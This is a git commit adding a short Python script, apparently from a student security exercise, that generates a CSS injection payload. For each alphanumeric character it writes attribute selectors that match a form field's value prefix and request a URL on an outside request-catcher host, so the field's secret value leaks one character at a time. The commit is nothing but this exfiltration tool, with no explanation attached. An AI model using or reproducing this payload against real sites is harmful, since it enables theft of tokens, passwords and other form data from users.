ac37add48d349f53191154445fe7993ad3e695a4
Timothy Didierjean <timothy.didierjean@epita.fr>
2025-05-19 14:34:23 +0200

    css

---
+++ web-client/main.py
@@ -0,0 +1,15 @@
+import string
+
+prefix = ""
+css = ""
+
+for c in filter(str.isalnum, string.printable):
+    payload = f"{prefix}{c}"
+    css += f"""
+[name="foo"][value^="{payload}"] {{
+    --value: url("https://toto.requestcatcher.com/{payload}")
+}}
+"""
+
+with open("style.css", "w") as f:
+    f.write(css)
